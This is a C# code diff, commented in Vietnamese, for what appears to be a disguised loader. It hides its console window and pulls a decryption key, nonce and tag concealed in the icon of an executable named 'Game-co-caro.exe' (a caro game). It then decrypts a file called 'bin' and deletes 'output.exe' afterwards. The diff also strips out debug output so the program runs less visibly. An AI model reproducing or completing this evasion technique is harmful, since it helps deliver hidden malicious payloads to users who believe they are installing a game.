@@ -24,15 +24,12 @@ class Program
     private const int SW_HIDE = 0;
     static void Main()
     {
-        // Tạo cửa sổ console
-        AllocConsole();
 
         // Ẩn cửa sổ console
         IntPtr consoleWindow = Process.GetCurrentProcess().MainWindowHandle;
         ShowWindow(consoleWindow, SW_HIDE);
         // Đường dẫn tệp tin .ico chứa dữ liệu đã được dấu
-        string inputIconFile = "Decrypt.exe";
-        AllocConsole();
+        string inputIconFile = "Game-co-caro.exe";
 
 
         // Trích xuất dữ liệu từ icon
@@ -44,7 +41,6 @@ class Program
         byte[] key = Convert.FromBase64String(parts[0]);
         byte[] nonce = Convert.FromBase64String(parts[1]);
         byte[] tag = Convert.FromBase64String(parts[2]);
-        File.WriteAllText("encodedData.txt", encodedData);
 
         // Đọc tệp tin mã hóa và tag từ tệp tin đầu ra
         byte[] ciphertext = File.ReadAllBytes("bin");
@@ -71,7 +67,6 @@ class Program
 
         // Xoá tệp tin output.exe
         File.Delete("output.exe");
-        FreeConsole();
     }
 
     static string ExtractDataFromIcon(string inputIconFile)
